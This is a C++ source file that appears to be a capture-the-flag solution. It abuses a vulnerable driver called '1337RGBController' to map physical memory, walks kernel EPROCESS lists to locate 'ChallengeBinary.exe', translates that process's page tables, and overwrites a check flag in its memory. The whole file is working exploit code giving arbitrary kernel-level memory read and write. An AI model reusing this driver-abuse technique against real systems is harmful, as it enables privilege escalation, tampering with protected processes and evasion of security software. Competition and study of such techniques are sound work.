#define NOMINMAX
#define WIN32_LEAN_AND_MEAN

#include <print>
#include <vector>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

#include <TlHelp32.h>

constexpr auto Ioctl = 2247900u;

#pragma section(".mvm", read, write)
__declspec(allocate(".mvm")) int Stub = 0;

DWORD GetProcessIdByName(const char* processName) {
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry{};
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				if (_stricmp(processEntry.szExeFile, processName) == 0) {
					processId = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processId;
}

void* IdentityMappingBase{};

void ReadPhysicalAddress(uint64_t aPhysicalAddress, void* aBuffer, SIZE_T aSize, SIZE_T* aReadSize)
{
	if (IdentityMappingBase == nullptr)
		return;
	RtlCopyMemory(aBuffer, (void*)((uint64_t)(IdentityMappingBase) + aPhysicalAddress), aSize);
	if (aReadSize)
		*aReadSize = aSize;
}

uint64_t TranslateVirtualAddressToPhysical(uint64_t aCR3, uint64_t aVirtualAddress)
{
    constexpr uint64_t PMASK = (~0xfull << 8) & 0xfffffffffull;

    aCR3 &= ~0xf;

    uint64_t pageOffset = aVirtualAddress & ~(~0ul << 12u);
    uint64_t pte = ((aVirtualAddress >> 12) & (0x1ffll));
    uint64_t pt = ((aVirtualAddress >> 21) & (0x1ffll));
    uint64_t pd = ((aVirtualAddress >> 30) & (0x1ffll));
    uint64_t pdp = ((aVirtualAddress >> 39) & (0x1ffll));

    SIZE_T readsize = 0;
    uint64_t pdpe = 0;
    ReadPhysicalAddress(aCR3 + 8 * pdp, &pdpe, sizeof(pdpe), &readsize);
    if (~pdpe & 1)
        return 0;

    uint64_t pde = 0;
    ReadPhysicalAddress((pdpe & PMASK) + 8 * pd, &pde, sizeof(pde), &readsize);
    if (~pde & 1)
        return 0;

    /* 1GB large page, use pde's 12-34 bits */
    if (pde & 0x80)
        return (pde & (~0ull << 42 >> 12)) + (aVirtualAddress & ~(~0ull << 30));

    uint64_t pteAddr = 0;
    ReadPhysicalAddress((pde & PMASK) + 8 * pt, &pteAddr, sizeof(pteAddr), &readsize);
    if (~pteAddr & 1)
        return 0;

    /* 2MB large page */
    if (pteAddr & 0x80)
        return (pteAddr & PMASK) + (aVirtualAddress & ~(~0ull << 21));

    aVirtualAddress = 0;
    ReadPhysicalAddress((pteAddr & PMASK) + 8 * pte, &aVirtualAddress, sizeof(aVirtualAddress), &readsize);
    aVirtualAddress &= PMASK;

    if (!aVirtualAddress)
        return 0;

    return aVirtualAddress + pageOffset;
}

void ReadVirtualMemory(uint64_t aCR3, uint64_t aVirtualAddress, void* aBuffer, SIZE_T aSize, SIZE_T* aReadSize)
{
	SIZE_T totalRead = 0;
	SIZE_T toRead = aSize;
	while (toRead > 0)
	{
		uint64_t physicalAddress = TranslateVirtualAddressToPhysical(aCR3, aVirtualAddress);
		if (physicalAddress == 0)
			break;
		SIZE_T chunkOffset = aVirtualAddress & 0xfff;
		SIZE_T chunkSize = std::min(toRead, 0x1000 - chunkOffset);
		SIZE_T readSize = 0;
		ReadPhysicalAddress(physicalAddress, (void*)((uint64_t)(aBuffer) + totalRead), chunkSize, &readSize);
		if (readSize == 0)
			break;
		totalRead += readSize;
		toRead -= readSize;
		aVirtualAddress += readSize;
	}
    if (aReadSize)
    {
        *aReadSize = totalRead;
	}
}

void WriteVirtualMemory(UINT64 aCR3, UINT64 aVirtualAddress, void* aBuffer, SIZE_T aSize, SIZE_T* aWrittenSize)
{
	SIZE_T totalWritten = 0;
	SIZE_T toWrite = aSize;
	while (toWrite > 0)
	{
		uint64_t physicalAddress = TranslateVirtualAddressToPhysical(aCR3, aVirtualAddress);
		if (physicalAddress == 0)
			break;
		SIZE_T chunkOffset = aVirtualAddress & 0xfff;
		SIZE_T chunkSize = std::min(toWrite, 0x1000 - chunkOffset);
		SIZE_T writtenSize = 0;
		RtlCopyMemory((void*)((uint64_t)(IdentityMappingBase) + physicalAddress), (void*)((uint64_t)(aBuffer) + totalWritten), chunkSize);
		writtenSize = chunkSize;
		if (writtenSize == 0)
			break;
		totalWritten += writtenSize;
		toWrite -= writtenSize;
		aVirtualAddress += writtenSize;
	}
	if (aWrittenSize)
	{
		*aWrittenSize = totalWritten;
	}
}

int main() {
	auto deviceHandle = CreateFileA("\\\\.\\1337RGBController", GENERIC_READ | GENERIC_WRITE, 0u, nullptr, OPEN_EXISTING, 0u, nullptr);

	if (deviceHandle == INVALID_HANDLE_VALUE) {
		std::println("Failed to open device: {:08x}\n", GetLastError());
		return 1;
	}

	std::println("Opened driver device!");

	struct Buffer {
		UINT64 DirectoryTableBase{};	// 00
		UINT64 Process{};				// 08
		UINT64 MappingBaseVirtAddr{};	// 10
		UINT64 MappingEndVirtAddr{};	// 18
	};

	Buffer buffer{};

	uint32_t bytesWritten{};

	FILETIME systemTime{};
    GetSystemTimeAsFileTime(&systemTime);

	LARGE_INTEGER timeAsInteger{.LowPart = systemTime.dwLowDateTime, .HighPart = (LONG)(systemTime.dwHighDateTime)};
	timeAsInteger.QuadPart &= ~(0xFFFull);

	char password[] = "happy birthday trixter!";

	uint64_t* aliasedPassword = (uint64_t*)password;

	for (auto i = 0u; i < (sizeof(password) / sizeof(uint64_t)); i++)
    {
        aliasedPassword[i] ^= timeAsInteger.QuadPart;
	}

	auto status = DeviceIoControl(
		deviceHandle,
		Ioctl,
		password, sizeof(password),
		&buffer,
		sizeof(Buffer),
		(LPDWORD)(&bytesWritten),
		nullptr
	);

	if(!status) {
		std::println("IOCTL failed: {:08x}\n", GetLastError());
		return 2;
	}

	std::println("CR3: {:016x}, mapping virt addr: {:016x}, process: {:016x}, status: {:08x}, written: {:08x}", buffer.DirectoryTableBase, buffer.MappingBaseVirtAddr, buffer.Process, status, bytesWritten);

	IdentityMappingBase = (void*)buffer.MappingBaseVirtAddr;

	auto pid = GetProcessIdByName("ChallengeBinary.exe");

	if (pid == 0u)
    {
		std::println("Failed to find process ID!\n");
		return 3;
    }

	auto testHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

	std::println("Process handle try: {:016x}", (uint64_t)testHandle);

	std::vector<HMODULE> moduleHandles(1024ull, HMODULE{});
    DWORD sizeNeeded{};

	if (EnumProcessModules(testHandle, moduleHandles.data(), moduleHandles.size() * sizeof(HMODULE), &sizeNeeded))
    {
        std::println("OK WTF this is some shit");

		for (auto i : moduleHandles)
        {
			if (i == nullptr)
			{
                break;
			}
            std::println("{}", (void*)i);
		}
	}
    else
    {
        std::println("OK we good I think, last error {}", GetLastError());
	}



	constexpr auto PAGETABLE_BASE_OFFSET = 0x28u;
	constexpr auto UNIQUE_PROCESS_ID_OFFSET = 0x1d0u;
	constexpr auto ACTIVE_PROCESS_LINKS_OFFSET = 0x1d8u;
    constexpr auto BASE_ADDRESS_OFFSET = 0x2b0u;

	/*
		+0x000 Flink            : Ptr64 _LIST_ENTRY
		+0x008 Blink            : Ptr64 _LIST_ENTRY
	*/

	LIST_ENTRY processLinks{};

	ReadVirtualMemory(
		buffer.DirectoryTableBase, buffer.Process + ACTIVE_PROCESS_LINKS_OFFSET, &processLinks,
		sizeof(LIST_ENTRY),
		nullptr);

	uint64_t targetProcess{};

	while (processLinks.Flink != processLinks.Blink)
    {
        auto nextProcess = (UINT64)(processLinks.Flink) - ACTIVE_PROCESS_LINKS_OFFSET;
		uint64_t processId{};

		ReadVirtualMemory(buffer.DirectoryTableBase, nextProcess + UNIQUE_PROCESS_ID_OFFSET, &processId, sizeof(uint64_t), nullptr);

		if (processId == pid)
        {
            targetProcess = nextProcess;
            std::println("Found target process! EPROCESS: {:016x}", nextProcess);
            break;
		}

        ReadVirtualMemory(buffer.DirectoryTableBase, (uint64_t)processLinks.Flink, &processLinks,
                          sizeof(LIST_ENTRY), nullptr);
	}

	if (targetProcess == 0u)
	{
        std::println("Failed to find target process EPROCESS!\n");
        return 4;
	}

	uint64_t baseAddress{};

	ReadVirtualMemory(
		buffer.DirectoryTableBase, targetProcess + BASE_ADDRESS_OFFSET, &baseAddress,
		sizeof(uint64_t),
                      nullptr);

	std::println("Base address of target process: {:016x}", baseAddress);

	uint64_t directoryTableBaseOfTargetProcess{};

	ReadVirtualMemory(
		buffer.DirectoryTableBase, targetProcess + PAGETABLE_BASE_OFFSET, &directoryTableBaseOfTargetProcess,
		sizeof(uint64_t), nullptr);

	std::println("CR3 of target process: {:016x}", directoryTableBaseOfTargetProcess);

	constexpr auto CHECKED_OFFSET = 0x19B50;

	DWORD writeBuf = 1u;

	WriteVirtualMemory(directoryTableBaseOfTargetProcess, baseAddress + CHECKED_OFFSET, &writeBuf, sizeof(writeBuf),
                       nullptr);

	return 0;
}
